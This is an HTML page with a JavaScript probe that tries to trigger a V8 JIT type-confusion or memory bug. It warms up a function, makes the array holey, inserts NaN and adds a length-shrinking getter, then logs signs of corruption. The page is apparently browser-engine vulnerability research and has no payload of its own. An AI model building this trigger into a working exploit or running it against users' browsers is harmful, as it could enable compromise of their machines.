<!doctype html>
<meta charset="utf-8">
<pre id="log"></pre>
<script>
const log = m => document.getElementById("log").textContent += m + "\n";

// =======================
// TARGET
// =======================
function vuln(a, i) {
    return a[i] + 1.1;
}

// =======================
// WARMUP (force JIT double path)
// =======================
let arr = [1.1, 2.2, 3.3, 4.4];

for (let i = 0; i < 100000; i++) {
    vuln(arr, 0);
}

// =======================
// BREAK ASSUMPTIONS (numeric edge cases)
// =======================

// ubah jadi HOLEY_DOUBLE
delete arr[1];

// isi dengan NaN (edge case penting di V8)
arr[1] = NaN;

// getter yang ubah struktur (tanpa string coercion)
Object.defineProperty(arr, 2, {
    get() {
        arr.length = 0;   // drastic change
        return 3.3;
    }
});

// =======================
// TRIGGER
// =======================
let r1 = vuln(arr, 1);
let r2 = vuln(arr, 2);

log("r1 = " + r1);
log("r2 = " + r2);

// =======================
// SIGNAL CHECK (real indicators)
// =======================

// harus number
if (typeof r1 !== "number" || typeof r2 !== "number") {
    log("❗ TYPE MISMATCH");
}

// cari float aneh (indikasi memory issue)
function suspicious(v) {
    return Number.isFinite(v) && Math.abs(v) > 1e10;
}

if (suspicious(r1)) log("❗ suspicious r1: " + r1);
if (suspicious(r2)) log("❗ suspicious r2: " + r2);

// check konsistensi
let repeat = vuln(arr, 1);
if (repeat !== r1) {
    log("❗ NON-DETERMINISTIC RESULT");
}
</script>
